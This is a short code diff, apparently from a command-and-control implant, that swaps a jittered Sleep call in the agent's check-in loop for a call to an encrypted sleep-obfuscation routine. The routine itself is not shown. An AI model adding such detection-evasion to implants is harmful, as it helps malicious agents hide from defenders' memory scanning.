@@ -2,6 +2,7 @@
 #include "package.h"
 #include "TaskController.h"
 #include "ListManager.h"
+#include "SleepObfMain.h"
 
 pAgent agent = { 0 };
 
@@ -45,7 +46,6 @@ void AgentRoutine() {
 			TaskingRoutine();
 		}
 
-		// Sleep for a while before checking in again. - TODO implement encrypted sleep obfuscation.
-		Sleep((agent->config->SleepTime * 1000) + ((GenerateRandomNumber() % agent->config->SleepJitter) * 1000));
+		PerformSleepObf();
 	}
 }
